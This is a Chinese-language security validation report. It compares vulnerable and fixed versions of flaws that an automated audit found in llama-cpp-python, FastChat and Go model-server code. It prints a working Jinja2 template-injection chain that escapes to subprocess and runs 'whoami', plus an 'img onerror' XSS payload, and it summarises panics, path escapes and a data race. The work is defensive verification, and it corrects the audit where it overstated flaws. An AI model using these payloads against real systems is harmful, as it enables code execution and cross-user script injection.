# 利用验证（PoC）说明：对系统检出的缺陷做"漏洞版触发 / 修复版拦截"对照

**日期**：2026-09-11 ｜ **目的**：验证对照池评测中系统复核成立（VALIDATED）的缺陷**真实可利用**，并检验"修复版是否真的修住了"。

> **口径**：本轮为**组件级验证（component-level）**——执行的是源码**原样**的目标函数/方法，只对重型外部依赖（llama_cpp 的 C 扩展、gradio 组件基类）使用桩替身；载荷全部**无害**（写标记文件、读主机名、改页面标题），无网络行为、无破坏性操作。
> **环境**：`04-利用验证/.venv`（Python 3.13 + jinja2 3.1.6 / markdown2 2.5.5 / nh3 0.3.7 / numpy 2.5.3）+ 本机 Chrome（无头模式做浏览器执行证明）+ Go 1.27.1（装在 `D:/kechngsheji/tools/go`，PoC3 全程 `GOPROXY=off` 离线构建）。

## PoC1 · llama-cpp-python Jinja2 模板注入 → 任意代码执行（对应 p01，CVE-2024-34359 的修复点）

**机理**：模型元数据里的 `tokenizer_config["chat_template"]` 是不可信输入，被 `jinja2.Environment`（**非沙箱**）直接编译渲染 → 模板内的 Python 属性链可达执行原语。

**载荷**（作为 `chat_template` 传入）：
```jinja
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}
{% set B = c.__init__.__globals__['__builtins__'] %}{% set IMP = B['__import__'] if B is mapping else B.__import__ %}
{{ IMP('pathlib').Path('jinja_poc_marker.txt').write_text(
   IMP('subprocess').run(['cmd','/c','whoami'],capture_output=True,text=True).stdout) }}
{% endif %}{% endfor %}
```

**结果**：

| 版本 | 结果 |
| --- | --- |
| **漏洞版** `vulnerable-llama_chat_format.py`（sha256 `be766d34…`） | 渲染成功，**模板代码在渲染期执行**：marker 文件内容 = 主机 `whoami` 的真实输出；渲染产物里出现执行函数的返回值 |
| **修复版** `fixed-llama_chat_format.py`（sha256 `f0e12c53…`） | `jinja2.exceptions.SecurityError: access to attribute '__class__' of 'tuple' object is unsafe.` —— **沙箱拒绝，未生成 marker** |

对照上游事实：修复提交（`561e8806`）正是把这里的 `jinja2.Environment` 换成 `ImmutableSandboxedEnvironment`——与对照池 ground truth 完全一致。**这次是"系统在审计里指出的缺陷"被独立复现出来。**

**证据**：`poc1-jinja模板注入/evidence/`
- `rendered_prompt_vuln.txt`（渲染产物）、`jinja_poc_marker_from_vuln.txt`（执行证明：whoami 输出）
- `blocked_fixed.txt`（修复版拒绝记录）、`结论.txt`

**边界声明**：完整攻击链还包含"把恶意 `chat_template` 打进 GGUF 元数据、由 llama-cpp-python 加载"一步，端到端复现需要构建 llama-cpp-python 的 C++ 扩展；本 PoC 验证的是其中**"渲染即执行"的核心环节**。

**复现**：`04-利用验证/.venv/Scripts/python.exe poc1-jinja模板注入/run_poc.py`

## PoC2 · FastChat gradio_patch 消息 HTML 注入 → 跨用户 XSS（对应 p03）

**机理**：`Chatbot.postprocess` 把用户消息**原文拼进** `<pre>`；助手消息走 markdown2（默认放行原始 HTML）。注入的 `<img onerror>` 在真实浏览器里执行。

**结果矩阵**（"浏览器"列 = Chrome 无头模式**真实渲染页面**后读取 `document.title`）：

| 用例 | 漏洞版输出 | 漏洞版浏览器 | 修复版输出 | 修复版浏览器 |
| --- | --- | --- | --- | --- |
| A 用户消息 `<img onerror="document.title='XSS-USER'">` | 原样保留 `onerror` | 标题变为 **XSS-USER**（脚本执行） | `<img src="x">`（`onerror` 被 `nh3.clean` 剥离） | 标题保持 BEFORE（**拦截**） |
| B 助手消息 同款载荷 | 原样保留 | **执行** | **仍原样保留（未净化）** | **仍然执行** |
| C 非字符串用户消息（dict） | `TypeError` | — | `TypeError` | — |

**结论（含一处对审计结论的修正）**：
1. **确认**：用户消息 XSS——漏洞版触发、修复版拦截。ground truth 缺陷成立。
2. **确认**：**上游修复不完整**——修复只净化了用户侧，助手消息在修复版仍可注入并在浏览器中真实执行。这与系统在修复版审计中的发现一致。
3. **修正**：系统在修复版报了"修复引入新缺陷：非字符串抛异常"——实测**漏洞版同样抛 `TypeError`**（`'<pre>' + dict`），这是该补丁遗留的**既有缺陷**，不是修复新引入的。审计在此处归因过度，应在结果文档里更正。

**证据**：`poc2-xss消息注入/evidence/`
- `vuln_user.html` / `vuln_assistant.html` / `fixed_user.html` / `fixed_assistant.html`（可直接用浏览器打开复看：前两个页面标题会变成 XSS-*，`fixed_user.html` 保持 BEFORE，`fixed_assistant.html` 仍会变）
- `结论.txt`

**复现**：`04-利用验证/.venv/Scripts/python.exe poc2-xss消息注入/run_poc.py`（需要本机 Chrome；路径在脚本开头可改）

## PoC3 · Go 目标四个组件级复现（p06 / p07 / p08 / p09）

**做法与两个 Python PoC 同构**：目标文件**原样**（导出的源码直接进模块），只对 cgo/重型依赖用替身；位于同包其它文件的缺失符号（`registryOptions`、`makeRequestWithRetry`、`ModelPath` 的两个方法、`setSparse` 等）在 `stubs.go` 里按上游原签名/原实现补桩并逐条注明来源。运行入口：`poc3-go复现/run_all.py`。

| 目标 | 漏洞版实测 | 修复版实测 | 结论 |
| --- | --- | --- | --- |
| **p06** Parts 越界 panic | `panic: runtime error: index out of range [0] with length 0`，栈直接钉到 **`server/download.go:175`**（`b.Parts[0].Size`）——HEAD 无 Content-Length → Total=0 → 分片循环不进入 → Parts 为空 | `POC_RESULT=NO_PANIC  Prepare 正常返回 err=nil` | ✅ 与审计 findings 机理完全一致；修复有效 |
| **p07** 相对路径解析基准 | Modelfile 相对路径按**服务进程 CWD** 解析，越出模型目录读取成功（读到 `SECRET-OUTSIDE-MODEL-DIR`） | A 相对路径（文件不在模型目录）→ **仍回落到 CWD 解析**、读取成功；B 绝对路径 → 原样放行、读取成功；C 文件确在模型目录 → 正确约束在目录内 | ✅ 漏洞成立；**修复不彻底**被实测坐实（与审计在修复版的发现一致） |
| **p08** NewNonce 缺上界校验 | `length=math.MaxInt64` 与 `-1` 均 `panic: makeslice: len out of range`（正常值 16 返回随机 nonce） | 两版该函数字节一致（修复没动它） | ⚠️ 机制成立，但**无攻击者可控入口**——两处调用方都硬编码传 16（`app/lifecycle/updater.go:52`、`server/auth.go:42`）；审计把它写成"未校验**传输的**长度"属过度归因，本 PoC 予以更正 |
| **p09** hashImage 数据竞争 | `go test -race`：`WARNING: DATA RACE` —— `hash/maphash.(*Hash).Reset()` ← `hashImage()`（`image.go:140`）← `NewEmbed()`（`image.go:71`，**在加锁之前**） | **同样报 DATA RACE**（该对修复针对零长度校验，不涉及竞争） | ✅ 真实缺陷、两侧都在——与审计"找到目标之外的其它真实 bug"一致 |

**证据**：`poc3-go复现/<目标>/evidence/`（各版本原始输出）；p06 另有 `vuln-panic-raw.txt`（不捕获的完整 panic 栈）；汇总见 `poc3-go复现/结论.txt`。
